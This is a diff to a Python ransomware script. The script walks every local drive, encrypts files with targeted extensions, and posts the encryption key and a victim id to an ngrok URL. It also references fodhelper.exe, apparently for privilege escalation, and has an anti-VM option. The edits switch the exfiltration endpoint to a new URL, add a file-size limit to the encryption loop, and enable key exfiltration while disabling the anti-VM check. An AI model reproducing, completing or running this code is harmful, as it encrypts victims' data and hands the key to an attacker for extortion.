@@ -7,8 +7,8 @@ import os
 import sys
 import ctypes
 import winreg
-import atexit
 
+TRIALDIR_PATH = r"C:\Users\Marqu\Downloads"
 CMD = r"C:\Windows\System32\cmd.exe"
 FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
 PYTHON_CMD = "python"
@@ -99,7 +99,7 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
         local_drives = cm.get_local_drives()
 
         cm.search_and_split(local_drives)
-
+    
         for ld in local_drives:
             for root, dirs, files in os.walk(ld):
                 [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
@@ -107,11 +107,12 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
                     full_path = root + os.sep + fn
                     ext = cm.get_file_extension(full_path)
                     if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT and fn != 'test.txt':
-                        cm.symmetric_encrypt_or_decrypt(full_path)
-                        print(full_path + ' -> [encrypted]')
+                        if os.path.getsize(full_path) < cm.MAX_SIZE_FILE:
+                            cm.symmetric_encrypt_or_decrypt(full_path)
+                            print(full_path + ' -> [encrypted]')
         
         if send_post:
-            cm.send_post_request(url='http://22c26716a8d8.ngrok.io/', id=str(id), key=cm.key)
+            cm.send_post_request(url='http://9ca31b80390f.ngrok.io', id=str(id), key=cm.key)
         else:
             cm.save_key_as_file(hidden=False)
 
@@ -124,12 +125,6 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
 
         
         print('All data was successfully encrypted')
-
-"""
-@atexit
-def bye():
-    os.system('cmd /c deleter.bat')
-"""
  
 if __name__ == '__main__':
-    execute_protocol(send_post=False, executable=False)
+    execute_protocol(antivm=False)
